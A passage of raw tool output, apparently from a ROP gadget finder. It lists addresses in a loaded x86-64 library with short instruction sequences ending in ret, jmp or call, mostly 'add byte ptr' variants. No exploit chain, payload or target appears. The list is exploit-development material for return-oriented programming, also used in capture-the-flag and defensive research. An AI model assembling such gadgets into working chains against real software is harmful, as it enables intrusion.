0x00002aaaaaaf7d7e : add byte ptr [rcx - 0x7d], cl ; ret
0x00002aaaaab693f1 : add byte ptr [rcx - 0x7d], cl ; ret 0x4101
0x00002aaaaabc25f5 : add byte ptr [rcx - 0x7d], cl ; ret 0x4118
0x00002aaaaab3b57b : add byte ptr [rcx - 0x7d], cl ; ret 0x4504
0x00002aaaaabb5ea6 : add byte ptr [rcx - 0x7d], cl ; ret 0x4801
0x00002aaaaaaf7cf7 : add byte ptr [rcx - 0x7d], cl ; ret 0x4901
0x00002aaaaaba97a2 : add byte ptr [rcx - 0x7d], cl ; ret 0x4c01
0x00002aaaaabe453f : add byte ptr [rcx - 0x7d], cl ; ret 0x4d30
0x00002aaaaac1926f : add byte ptr [rcx - 0x7d], cl ; ret 0x7f10
0x00002aaaaab5a7e0 : add byte ptr [rcx - 0x7d], cl ; ret 0xe96e
0x00002aaaaab5e2ef : add byte ptr [rcx - 0x7d], cl ; ret 0xf10
0x00002aaaaab0ff9c : add byte ptr [rcx - 0x7e37763a], cl ; ret 0x3039
0x00002aaaaab91a3b : add byte ptr [rcx - 0x7f], al ; shr byte ptr [rbx + 7], 0 ; add byte ptr [rax + 1], cl ; ret 0x8d48
0x00002aaaaab91cbf : add byte ptr [rcx - 0x7f], cl ; ret
0x00002aaaaabc8cb0 : add byte ptr [rcx - 0x80], al ; jmp qword ptr [rdi]
0x00002aaaaabc8c2f : add byte ptr [rcx - 0x80], al ; jmp qword ptr [rdx]
0x00002aaaaabff00f : add byte ptr [rcx - 0x80], al ; stc ; cmp cl, byte ptr [rdi] ; xchg eax, ebp ; ret 0x8041
0x00002aaaaaafb556 : add byte ptr [rcx - 0xa], al ; ret
0x00002aaaaabf5ad7 : add byte ptr [rcx - 0xa], al ; ret 0x7502
0x00002aaaaab552a3 : add byte ptr [rcx - 0xa], al ; ret 0xf01
0x00002aaaaabe4753 : add byte ptr [rcx - 0xa], al ; ret 0xf10
0x00002aaaaaba164a : add byte ptr [rcx - 0xcf68130], cl ; ret
0x00002aaaaac6872f : add byte ptr [rcx - 0xd], bl ; clc ; ret 0x6e1f
0x00002aaaaac69f90 : add byte ptr [rcx - 4], dl ; jmp qword ptr [rax + 0x20fffc58]
0x00002aaaaac6e8a7 : add byte ptr [rcx - 8], al ; jmp rsp
0x00002aaaaab63062 : add byte ptr [rcx - 9], cl ; ret 1
0x00002aaaaab63088 : add byte ptr [rcx - 9], cl ; ret 2
0x00002aaaaac88005 : add byte ptr [rcx], 0 ; cmp byte ptr [rbx - 0xa], cl ; call qword ptr [rax]
0x00002aaaaac5efeb : add byte ptr [rcx], al ; adc byte ptr [rax], al ; add byte ptr [rax], al ; ret 1
0x00002aaaaab5c8d3 : add byte ptr [rcx], al ; add byte ptr [rax], al ; add byte ptr [rbp + 0x41], bl ; pop rsp ; ret
0x00002aaaaab030e9 : add byte ptr [rcx], al ; add byte ptr [rax], al ; and eax, esi ; ret
0x00002aaaaaba1ee2 : add byte ptr [rcx], al ; add byte ptr [rax], al ; cmp rdx, rcx ; jne 0xccf19 ; ret
0x00002aaaaabcabf7 : add byte ptr [rcx], al ; add byte ptr [rax], al ; mov qword ptr [rsi + 0x78], rax ; xor eax, eax ; ret
0x00002aaaaac0ba81 : add byte ptr [rcx], al ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab62b91 : add byte ptr [rcx], al ; add byte ptr [rax], al ; ret
0x00002aaaaab5f78f : add byte ptr [rcx], al ; add byte ptr [rax], al ; sub rax, rdx ; ret
0x00002aaaaab61bff : add byte ptr [rcx], al ; add byte ptr [rax], al ; xor edx, edx ; or cl, cl ; cmove rax, rdx ; ret
0x00002aaaaac6d32f : add byte ptr [rcx], al ; cmc ; jmp rsp
0x00002aaaaabee7e0 : add byte ptr [rcx], al ; jmp 0x1195ab
0x00002aaaaabeeba0 : add byte ptr [rcx], al ; jmp 0x11997b
0x00002aaaaab02e34 : add byte ptr [rcx], al ; movzx eax, ax ; ret
0x00002aaaaac1055f : add byte ptr [rcx], al ; push rdi ; sub byte ptr [rax + 1], bh ; ret
0x00002aaaaab51bad : add byte ptr [rcx], al ; ret
0x00002aaaaabaee77 : add byte ptr [rcx], al ; ret 0x8b48
0x00002aaaaabb060a : add byte ptr [rcx], al ; ret 0xc083
0x00002aaaaabb2d0e : add byte ptr [rcx], al ; ret 0xda39
0x00002aaaaaba1e23 : add byte ptr [rcx], al ; sbb dword ptr [rbp + rsi*2 - 0x7e], edx ; mov eax, 0x7d00 ; ret
0x00002aaaaaba9fb7 : add byte ptr [rcx], al ; setg dl ; jmp 0xd4f44
0x00002aaaaab8e247 : add byte ptr [rcx], bh ; ret
0x00002aaaaab0b8a0 : add byte ptr [rcx], bh ; ret 0x237f
0x00002aaaaaba8a1d : add byte ptr [rcx], bh ; ret 0x840f
0x00002aaaaabaf664 : add byte ptr [rcx], bh ; ret 0x8d0f
0x00002aaaaabb4be7 : add byte ptr [rcx], bh ; ret 0x8f0f
0x00002aaaaabaf4fd : add byte ptr [rcx], bh ; ret 0x947c
0x00002aaaaac69280 : add byte ptr [rcx], bl ; sti ; push rax ; sbb ebx, edi ; jmp rax
0x00002aaaaac9116b : add byte ptr [rcx], ch ; add byte ptr [rax], al ; ret
0x00002aaaaabe5017 : add byte ptr [rcx], ch ; clc ; ret
0x00002aaaaab61e46 : add byte ptr [rcx], ch ; ret
0x00002aaaaab96cc1 : add byte ptr [rcx], ch ; ret 0x2941
0x00002aaaaab91b26 : add byte ptr [rcx], ch ; ret 0x428d
0x00002aaaaab9a433 : add byte ptr [rcx], ch ; ret 0x748d
0x00002aaaaab9864f : add byte ptr [rcx], ch ; ret 0x8d41
0x00002aaaaab96c84 : add byte ptr [rcx], ch ; ret 0xbe0f
0x00002aaaaac1ec3d : add byte ptr [rcx], ch ; ret 0xca39
0x00002aaaaab09efe : add byte ptr [rcx], ch ; ret 0xd089
0x00002aaaaab9ab7f : add byte ptr [rcx], ch ; ret 0xd129
0x00002aaaaab968b0 : add byte ptr [rcx], ch ; ret 0xd629
0x00002aaaaab9a3a3 : add byte ptr [rcx], ch ; ret 0xf889
0x00002aaaaabd1141 : add byte ptr [rcx], ch ; sal bl, 1 ; ret
0x00002aaaaab08f09 : add byte ptr [rcx], cl ; add byte ptr [rax], al ; add byte ptr [rax - 1], bh ; pop rbx ; ret
0x00002aaaaab48c9e : add byte ptr [rcx], cl ; add byte ptr [rax], al ; add byte ptr [rax - 1], bh ; ret
0x00002aaaaabed831 : add byte ptr [rcx], cl ; clc ; bswap eax ; ret
0x00002aaaaabdb965 : add byte ptr [rcx], cl ; clc ; ret
0x00002aaaaab4ed2a : add byte ptr [rcx], cl ; ret 0x8948
0x00002aaaaabb4b4f : add byte ptr [rcx], cl ; ret 0xb60f
0x00002aaaaab09f32 : add byte ptr [rcx], cl ; ror byte ptr [rcx - 0x24efdbbc], 1 ; insb byte ptr [rdi], dx ; and al, 8 ; ret
0x00002aaaaab39122 : add byte ptr [rcx], dh ; div dh ; ret
0x00002aaaaab09a6f : add byte ptr [rcx], dh ; leave ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab6b333 : add byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaac0bed8 : add byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; ret
0x00002aaaaab8f9b7 : add byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r14 ; ret
0x00002aaaaab0f26c : add byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaab02f2f : add byte ptr [rcx], dh ; rol byte ptr [rbx - 0x6bf07f19], 0xc0 ; ret
0x00002aaaaab10f27 : add byte ptr [rcx], dh ; ror byte ptr [rax + 1], cl ; ret 0xe974
0x00002aaaaabc40ef : add byte ptr [rcx], dh ; ror byte ptr [rax - 0x77], cl ; out dx, al ; mov rdi, rbx ; call 0x3b3cb
0x00002aaaaab4f38f : add byte ptr [rcx], dh ; ror byte ptr [rax - 0x7b], 0xd2 ; jne 0x7a3a8 ; ret
0x00002aaaaabd68f9 : add byte ptr [rcx], dh ; ror byte ptr [rax - 0x7d], 0x3e ; add byte ptr [rsi + rax + 0x5b], dh ; ret
0x00002aaaaab0f08b : add byte ptr [rcx], dh ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaabcb28c : add byte ptr [rcx], dh ; ror byte ptr [rax - 0x7d], 0xec ; sbb byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaab61c02 : add byte ptr [rcx], dh ; ror byte ptr [rax], cl ; leave ; cmove rax, rdx ; ret
0x00002aaaaaaf9c26 : add byte ptr [rcx], dh ; ror byte ptr [rcx + 0x39], cl ; ret 0x1e76
0x00002aaaaaaf8dc3 : add byte ptr [rcx], dh ; ror byte ptr [rcx + 0x39], cl ; ret 0x2576
0x00002aaaaaaf926e : add byte ptr [rcx], dh ; ror byte ptr [rcx + 0x39], cl ; ret 0x2876
0x00002aaaaabf745c : add byte ptr [rcx], dh ; ror byte ptr [rcx - 0x76b7f3a9], 0x3e ; ret
0x00002aaaaabcf0d3 : add byte ptr [rcx], dh ; sal byte ptr [rcx], cl ; div byte ptr [rcx] ; shr al, 0x71 ; ret
0x00002aaaaac83c63 : add byte ptr [rdi + 0x1c480001], ch ; cmc ; call qword ptr [rdx]
0x00002aaaaab5e1e0 : add byte ptr [rdi + 0x63], cl ; or al, 0x8a ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac2d35a : add byte ptr [rdi + 0x63], cl ; or al, 0x8b ; add r9, r11 ; jmp r9
0x00002aaaaac2542a : add byte ptr [rdi + 0x63], cl ; or al, 0x8b ; lea r9, qword ptr [r11 + r9] ; jmp r9
0x00002aaaaab800b4 : add byte ptr [rdi + 2], bh ; neg eax ; ret
0x00002aaaaabed4a6 : add byte ptr [rdi + 8], dh ; mov rax, rdi ; sar rax, 6 ; ret
0x00002aaaaac46d44 : add byte ptr [rdi + 9], bh ; neg eax ; ret
0x00002aaaaab5ff5a : add byte ptr [rdi + rax + 0x48], dh ; lea eax, dword ptr [rip + 0x1713c] ; ret
0x00002aaaaab5dcfa : add byte ptr [rdi + rax + 0x48], dh ; lea eax, dword ptr [rip + 0x1777c] ; ret
0x00002aaaaab63636 : add byte ptr [rdi + rax + 0x48], dh ; lea eax, dword ptr [rip + 0x1b330] ; ret
0x00002aaaaabea67d : add byte ptr [rdi + rax + 0x48], dh ; lea eax, dword ptr [rip + 0x37c19] ; ret
0x00002aaaaabea76d : add byte ptr [rdi + rax + 0x48], dh ; lea eax, dword ptr [rip + 0x37ec9] ; ret
0x00002aaaaab6889f : add byte ptr [rdi + rax + 0x48], dh ; lea eax, dword ptr [rip + 0xbcb07] ; ret
0x00002aaaaab61ee7 : add byte ptr [rdi + rax + 0x48], dh ; lea eax, dword ptr [rip + 0xbcd7f] ; ret
0x00002aaaaab61b57 : add byte ptr [rdi + rax + 0x48], dh ; lea eax, dword ptr [rip + 0xbcfdf] ; ret
0x00002aaaaab637dd : add byte ptr [rdi + rax + 0x48], dh ; lea eax, dword ptr [rip + 0xbee69] ; ret
0x00002aaaaab5f6e7 : add byte ptr [rdi + rax + 0x48], dh ; lea eax, dword ptr [rip + 0xbf30f] ; ret
0x00002aaaaab6183a : add byte ptr [rdi + rax + 0x48], dh ; lea eax, dword ptr [rip + 0xd999c] ; ret
0x00002aaaaab63cca : add byte ptr [rdi + rax + 0x48], dh ; lea eax, dword ptr [rip + 0xda08c] ; ret
0x00002aaaaab5f5da : add byte ptr [rdi + rax + 0x48], dh ; lea eax, dword ptr [rip + 0xda44c] ; ret
0x00002aaaaab63dea : add byte ptr [rdi + rax + 0x48], dh ; lea eax, dword ptr [rip + 0xdb77c] ; ret
0x00002aaaaab5dee7 : add byte ptr [rdi + rax + 0x48], dh ; lea eax, dword ptr [rip + 0xe6dbf] ; ret
0x00002aaaaabea7b6 : add byte ptr [rdi + rax + 0x48], dh ; lea eax, dword ptr [rip - 0x6be60] ; ret
0x00002aaaaac6b19f : add byte ptr [rdi + rax - 0x16], al ; jmp rsp
0x00002aaaaac6b6a7 : add byte ptr [rdi + rax*2 - 0x15], ah ; jmp rsp
0x00002aaaaac6f0cf : add byte ptr [rdi + rax*4 - 7], al ; call rsp
0x00002aaaaac6bbaf : add byte ptr [rdi + rax*8 - 0x13], al ; call rsp
0x00002aaaaab9c526 : add byte ptr [rdi + rax*8], ah ; add al, byte ptr [rax] ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaab57336 : add byte ptr [rdi + rax*8], ah ; or al, 0 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaaaf6226 : add byte ptr [rdi + rax*8], ah ; or dword ptr [rax], eax ; add byte ptr [rax], al ; mov eax, edi ; ret
0x00002aaaaab08e9e : add byte ptr [rdi + rax*8], ah ; sub al, byte ptr [rax] ; add byte ptr [rax], al ; mov rax, rcx ; ret
0x00002aaaaac7c643 : add byte ptr [rdi + rax*8], cl ; add byte ptr [rax], al ; cmp byte ptr [rdi - 0x10], al ; jmp qword ptr [rdi]
0x00002aaaaac86ef3 : add byte ptr [rdi + rbp*2 + 0x18f80001], bh ; stc ; jmp qword ptr [rsi]
0x00002aaaaac86ec3 : add byte ptr [rdi + rbp*2 + 0x18f80001], cl ; stc ; jmp qword ptr [rsi]
0x00002aaaaac86e4b : add byte ptr [rdi + rbp*2], dl ; add dword ptr [rax], eax ; push rax ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac7aef3 : add byte ptr [rdi + rbp*4 - 0x780000], bh ; stc ; call qword ptr [rax]
0x00002aaaaac82e5b : add byte ptr [rdi + rbp], ah ; add dword ptr [rax], eax ; jo 0x1ade49 ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac82e73 : add byte ptr [rdi + rbp], bh ; add dword ptr [rax], eax ; mov bh, bl ; hlt ; call qword ptr [rbx]
0x00002aaaaac82e43 : add byte ptr [rdi + rbp], cl ; add dword ptr [rax], eax ; pop rax ; fcompi st(4) ; jmp qword ptr [rcx]
0x00002aaaaac81ee3 : add byte ptr [rdi + rbx - 0x6ce7ffff], ch ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac7dec3 : add byte ptr [rdi + rbx*8 - 0x6a480000], cl ; int1 ; call qword ptr [rax]
0x00002aaaaac7dedb : add byte ptr [rdi + rbx*8 - 0x6a500000], ah ; int1 ; call qword ptr [rax]
0x00002aaaaac6feaf : add byte ptr [rdi + rbx*8 - 3], al ; call rsp
0x00002aaaaac7de43 : add byte ptr [rdi + rbx*8], cl ; add byte ptr [rax], al ; int1 ; call qword ptr [rdx]
0x00002aaaaab28f6a : add byte ptr [rdi + rcx + 0x44], cl ; ret 0xf4c
0x00002aaaaab27ef3 : add byte ptr [rdi + rcx + 0x45], cl ; ret 0xf4c
0x00002aaaaabed9a7 : add byte ptr [rdi + rcx - 0x42], cl ; ret 0xf643
0x00002aaaaac6e77f : add byte ptr [rdi + rcx - 8], dh ; jmp rsp
0x00002aaaaac84ecb : add byte ptr [rdi + rcx*2 + 0x6fe00001], dl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84ee3 : add byte ptr [rdi + rcx*2 + 0x6ff80001], ch ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac74e5b : add byte ptr [rdi + rcx*2], ah ; add byte ptr [rax], al ; nop ; pop rsp ; jmp 0x19fe6b
0x00002aaaaac84e3b : add byte ptr [rdi + rcx*2], al ; add dword ptr [rax], eax ; and byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac84e53 : add byte ptr [rdi + rcx*2], bl ; add dword ptr [rax], eax ; cmp byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaab02d34 : add byte ptr [rdi + rcx], al ; mov bh, 0xc0 ; ret
0x00002aaaaac8be93 : add byte ptr [rdi + rdi*4 + 1], bl ; add byte ptr [rax], cl ; push 0xf7 ; jmp rsi
0x00002aaaaac6fa3f : add byte ptr [rdi + rdi*4 - 6], dl ; jmp rsp
0x00002aaaaac83e4b : add byte ptr [rdi + rdi], dl ; add dword ptr [rax], eax ; rcr byte ptr [rdi], 1 ; cmc ; jmp qword ptr [rdx]
0x00002aaaaac7965b : add byte ptr [rdi + rdx*4], ah ; add byte ptr [rax], al ; rol dl, 1 ; in eax, dx ; jmp qword ptr [rsi]
0x00002aaaaac6fda7 : add byte ptr [rdi + rsi*2 - 3], al ; call rsp
0x00002aaaaac6b91f : add byte ptr [rdi + rsi*2], al ; in eax, dx ; jmp rsp
0x00002aaaaac6f1d7 : add byte ptr [rdi + rsi*4 - 7], al ; call rsp
0x00002aaaaac6ddaf : add byte ptr [rdi + rsi*8 - 0xa], dl ; call rsp
0x00002aaaaac7f683 : add byte ptr [rdi + rsi*8], cl ; add byte ptr [rax + 0x2c], cl ; jmp rcx
0x00002aaaaac7363b : add byte ptr [rdi + rsi], al ; add byte ptr [rax], al ; or ch, 0xe9 ; call qword ptr [rdx]
0x00002aaaaac7366b : add byte ptr [rdi + rsi], dh ; add byte ptr [rax], al ; or ch, 0xe9 ; call qword ptr [rdx]
0x00002aaaaac7e6f3 : add byte ptr [rdi - 0x10d80000], bh ; int1 ; jmp rcx
0x00002aaaaaba1fc8 : add byte ptr [rdi - 0x48], dh ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaac6a9c0 : add byte ptr [rdi - 0x618f0004], bl ; cld ; jmp rax
0x00002aaaaabbc64a : add byte ptr [rdi - 0xa], dh ; ret
0x00002aaaaab805c7 : add byte ptr [rdi - 0xd], bh ; setl al ; movzx eax, al ; neg eax ; ret
0x00002aaaaac6ca9f : add byte ptr [rdi - 0xf], dl ; jmp rsp
0x00002aaaaac77c5b : add byte ptr [rdi*2 + 0x4b900000], ah ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac91a34 : add byte ptr [rdi], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 7
0x00002aaaaab09dd0 : add byte ptr [rdi], bh ; movd xmm0, eax ; mov dword ptr [rdi], edx ; ret
0x00002aaaaabcb3e1 : add byte ptr [rdi], bl ; add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x00002aaaaac82653 : add byte ptr [rdi], bl ; add dword ptr [rax], eax ; js 0x1ad60a ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac69a40 : add byte ptr [rdi], ch ; cld ; call rax
0x00002aaaaabe9dc7 : add byte ptr [rdi], cl ; add eax, 0x89c78944 ; ret
0x00002aaaaac2ecd6 : add byte ptr [rdi], cl ; cmp dword ptr [rbx - 1], -1 ; dec dword ptr [rax - 0x7f] ; ret 0x80
0x00002aaaaac09de9 : add byte ptr [rdi], cl ; enter 0x4289, 0x10 ; mov eax, 1 ; ret
0x00002aaaaac09cc9 : add byte ptr [rdi], cl ; enter 0x4289, 0xc ; mov eax, 1 ; ret
0x00002aaaaab7efe7 : add byte ptr [rdi], cl ; lahf ; ret 0xea81
0x00002aaaaac2fd0f : add byte ptr [rdi], cl ; mov bh, 0x16 ; mov word ptr [rdi], dx ; ret
0x00002aaaaabdce81 : add byte ptr [rdi], cl ; mov bh, 0xff ; mov eax, dword ptr [rax + rdi*4] ; ret
0x00002aaaaabde8a4 : add byte ptr [rdi], cl ; mov bh, 4 ; js 0x109838 ; loopne 0x1098bf ; movzx eax, ax ; ret
0x00002aaaaabde9d4 : add byte ptr [rdi], cl ; mov bh, 4 ; js 0x109965 ; loopne 0x1099e5 ; ret
0x00002aaaaabdea64 : add byte ptr [rdi], cl ; mov bh, 4 ; js 0x1099f8 ; loopne 0x109a79 ; movzx eax, ax ; ret
0x00002aaaaabded64 : add byte ptr [rdi], cl ; mov bh, 4 ; js 0x109cf8 ; loopne 0x109d7b ; movzx eax, ax ; ret
0x00002aaaaab02d0d : add byte ptr [rdi], cl ; mov bh, 4 ; js 0x2dca1 ; loopne 0x2dd28 ; movzx eax, ax ; ret
0x00002aaaaab02d4d : add byte ptr [rdi], cl ; mov bh, 4 ; js 0x2dce1 ; loopne 0x2dd62 ; movzx eax, ax ; ret
0x00002aaaaab02ded : add byte ptr [rdi], cl ; mov bh, 4 ; js 0x2dd81 ; loopne 0x2de04 ; movzx eax, ax ; ret
0x00002aaaaab02ecd : add byte ptr [rdi], cl ; mov bh, 4 ; js 0x2de5e ; loopne 0x2dede ; ret
0x00002aaaaac2fd7f : add byte ptr [rdi], cl ; mov dh, 0x16 ; mov byte ptr [rdi], dl ; ret
0x00002aaaaaba2fd7 : add byte ptr [rdi], cl ; mov dh, 0x42 ; add dword ptr [rax - 0x7d], ecx ; ret 0x8401
0x00002aaaaabfd21f : add byte ptr [rdi], cl ; mov dh, 0x43 ; add dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaac4623f : add byte ptr [rdi], cl ; mov dh, 0x47 ; cmc ; movzx edx, byte ptr [rsi - 0xb] ; sub eax, edx ; ret
0x00002aaaaac4622f : add byte ptr [rdi], cl ; mov dh, 0x47 ; hlt ; movzx edx, byte ptr [rsi - 0xc] ; sub eax, edx ; ret
0x00002aaaaac461ff : add byte ptr [rdi], cl ; mov dh, 0x47 ; int1 ; movzx edx, byte ptr [rsi - 0xf] ; sub eax, edx ; ret
0x00002aaaaac4621f : add byte ptr [rdi], cl ; mov dh, 0x47 ; movzx edx, byte ptr [rsi - 0xd] ; sub eax, edx ; ret
0x00002aaaaac4620f : add byte ptr [rdi], cl ; mov dh, 0x47 ; movzx edx, byte ptr [rsi - 0xe] ; sub eax, edx ; ret
0x00002aaaaaafac57 : add byte ptr [rdi], cl ; mov dh, 0x4a ; dec dword ptr [rax - 0x7d] ; ret 0x4801
0x00002aaaaaba5d3f : add byte ptr [rdi], cl ; mov dh, 0x4b ; add ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaab41e27 : add byte ptr [rdi], cl ; mov dh, 0x53 ; or al, 0xf6 ; ret 0xf04
0x00002aaaaaba83fd : add byte ptr [rdi], cl ; mov dh, 0xc0 ; movsxd rax, dword ptr [rdi + rax*4] ; add rax, rdi ; jmp rax
0x00002aaaaab95339 : add byte ptr [rdi], cl ; mov dh, 0xc0 ; movsxd rax, dword ptr [rdx + rax*4] ; add rdx, rax ; jmp rdx
0x00002aaaaab412fd : add byte ptr [rdi], cl ; mov dh, 0xc0 ; movsxd rax, dword ptr [rsi + rax*4] ; add rsi, rax ; jmp rsi
0x00002aaaaab97629 : add byte ptr [rdi], cl ; mov dh, 0xd1 ; movsxd rdx, dword ptr [rax + rdx*4] ; add rax, rdx ; jmp rax
0x00002aaaaab5f58f : add byte ptr [rdi], cl ; mov dh, 0xe ; movzx eax, byte ptr [rdi] ; sub eax, ecx ; ret
0x00002aaaaab80f50 : add byte ptr [rdi], cl ; mov dh, 0xf3 ; mov rdi, qword ptr [rbp] ; call r12
0x00002aaaaab4f61f : add byte ptr [rdi], cl ; mov dh, 2 ; ret
0x00002aaaaac4286f : add byte ptr [rdi], cl ; mov dh, 7 ; movzx ecx, byte ptr [rsi] ; sub eax, ecx ; ret
0x00002aaaaab6310f : add byte ptr [rdi], cl ; mov dh, 7 ; movzx edx, byte ptr [rsi] ; sub eax, edx ; ret
0x00002aaaaab7353f : add byte ptr [rdi], cl ; mov ebp, 0x448d48c0 ; cmp byte ptr [rax], ah ; ret
0x00002aaaaab7354f : add byte ptr [rdi], cl ; mov ebp, 0x448d48c0 ; cmp byte ptr [rax], dh ; ret
0x00002aaaaab7352f : add byte ptr [rdi], cl ; mov ebp, 0x448d48c0 ; cmp byte ptr [rax], dl ; ret
0x00002aaaaab735af : add byte ptr [rdi], cl ; mov ebp, 0xea8348c0 ; adc byte ptr [rax + 1], cl ; ret 0x147c
0x00002aaaaab7358f : add byte ptr [rdi], cl ; mov ebp, 0xea8348c0 ; and byte ptr [rax + 1], cl ; ret 0x347c
0x00002aaaaab7308f : add byte ptr [rdi], cl ; mov esi, 0x74c08407 ; and al, 0x39 ; ret 0x2574
0x00002aaaaab72f4f : add byte ptr [rdi], cl ; mov esi, 0x74c08407 ; sub edi, dword ptr [rcx] ; ret 0x2774
0x00002aaaaab6ab5f : add byte ptr [rdi], cl ; mov esp, 0x448d48c0 ; cmp al, dh ; ret
0x00002aaaaab62f9f : add byte ptr [rdi], cl ; mov esp, 0x448d48c0 ; cmp byte ptr [rax], ah ; ret
0x00002aaaaab62f8f : add byte ptr [rdi], cl ; mov esp, 0x448d48c0 ; cmp byte ptr [rax], dl ; ret
0x00002aaaaab62f7f : add byte ptr [rdi], cl ; mov esp, 0xf80148c0 ; ret
0x00002aaaaab09bc7 : add byte ptr [rdi], cl ; push rsp ; ret
0x00002aaaaab09df6 : add byte ptr [rdi], cl ; push rsp ; ret 0x2e0f
0x00002aaaaab99736 : add byte ptr [rdi], cl ; ret
0x00002aaaaab99a50 : add byte ptr [rdi], cl ; ret 0x144
0x00002aaaaac1185d : add byte ptr [rdi], cl ; ret 0x3145
0x00002aaaaab90af7 : add byte ptr [rdi], cl ; ret 0x3bba
0x00002aaaaaaff850 : add byte ptr [rdi], cl ; ret 0x4389
0x00002aaaaabb357c : add byte ptr [rdi], cl ; ret 0x833b
0x00002aaaaab1a6ae : add byte ptr [rdi], cl ; ret 0x8539
0x00002aaaaac16f6e : add byte ptr [rdi], cl ; ret 0x8941
0x00002aaaaac07ff1 : add byte ptr [rdi], cl ; ret 0x8d48
0x00002aaaaab05316 : add byte ptr [rdi], cl ; ret 0x8d49
0x00002aaaaabcfc9a : add byte ptr [rdi], cl ; ret 0x90c3
0x00002aaaaabbf35a : add byte ptr [rdi], cl ; ret 0xa6e9
0x00002aaaaab8a93e : add byte ptr [rdi], cl ; ret 0xc3f3
0x00002aaaaababcc0 : add byte ptr [rdi], cl ; ret 0xc689
0x00002aaaaab979a1 : add byte ptr [rdi], cl ; ret 0xd801
0x00002aaaaabf7d1b : add byte ptr [rdi], cl ; ret 0xf3c3
0x00002aaaaabf7cc0 : add byte ptr [rdi], cl ; ret 0xfc3
0x00002aaaaabf7cfb : add byte ptr [rdi], cl ; ret 0xff83
0x00002aaaaab09e5f : add byte ptr [rdi], cl ; sub cl, al ; add rsp, 0x28 ; ret
0x00002aaaaab1c64c : add byte ptr [rdi], cl ; test byte ptr [rdi - 0x7b000000], bh ; fisttp dword ptr [rdi] ; xchg eax, ebp ; ret 0x854d
0x00002aaaaaafb550 : add byte ptr [rdi], cl ; test byte ptr [rdi], cl ; add dword ptr [rax], eax ; add byte ptr [rcx - 0xa], al ; ret
0x00002aaaaab104f9 : add byte ptr [rdi], cl ; test dword ptr [rbx], esi ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaab109c9 : add byte ptr [rdi], cl ; test dword ptr [rdx], eax ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaab2c44b : add byte ptr [rdi], cl ; xchg dword ptr [rbx + rcx], esi ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabb4b3d : add byte ptr [rdi], cl ; xchg eax, ebp ; ret 0x8488
0x00002aaaaab912f1 : add byte ptr [rdi], cl ; xchg eax, ebp ; ret 0xb60f
0x00002aaaaab9125d : add byte ptr [rdi], cl ; xchg eax, ebp ; ret 0xf748
0x00002aaaaac0b26b : add byte ptr [rdi], cl ; xchg eax, ebp ; ror byte ptr [rax - 0x7d], 0xc4 ; jo 0x1362d8 ; ret
0x00002aaaaabd3c12 : add byte ptr [rdi], cl ; xchg eax, ebp ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rdi], cl ; mov dh, 0xc0 ; ret
0x00002aaaaac1eb87 : add byte ptr [rdi], cl ; xchg eax, edx ; ret 0xf40
0x00002aaaaab36a3f : add byte ptr [rdi], cl ; xchg eax, esp ; ret
0x00002aaaaabad2ce : add byte ptr [rdi], cl ; xchg eax, esp ; ret 0x4422
0x00002aaaaac8266b : add byte ptr [rdi], dh ; add dword ptr [rax], eax ; nop ; test al, 0xf4 ; jmp qword ptr [rcx]
0x00002aaaaac169b9 : add byte ptr [rdx + 0x190], bh ; call 0x2dc48
0x00002aaaaac008bb : add byte ptr [rdx + 0x19], ch ; call qword ptr [rax]
0x00002aaaaaaf6971 : add byte ptr [rdx + 0x2c], bh ; call 0x2dc48
0x00002aaaaab7e00f : add byte ptr [rdx + 0x30178816], cl ; in eax, dx ; mov byte ptr [rdi + 1], ch ; ret
0x00002aaaaac3f3ff : add byte ptr [rdx + 0x48028801], cl ; lea eax, dword ptr [rdx] ; ret
0x00002aaaaac3b0cf : add byte ptr [rdx + 0x48028801], cl ; mov eax, edi ; ret
0x00002aaaaab7c59f : add byte ptr [rdx + 0x48178816], cl ; lea eax, dword ptr [rdi + 1] ; ret
0x00002aaaaaaf6952 : add byte ptr [rdx + 0x4a], bh ; call 0x2dc48
0x00002aaaaaba5ffd : add byte ptr [rdx + 0x63], cl ; adc al, 0xb0 ; add rax, rdx ; jmp rax
0x00002aaaaac8144b : add byte ptr [rdx + 0xd500001], dl ; hlt ; jmp rcx
0x00002aaaaaade207 : add byte ptr [rdx + 1], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac91d2f : add byte ptr [rdx + 4], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
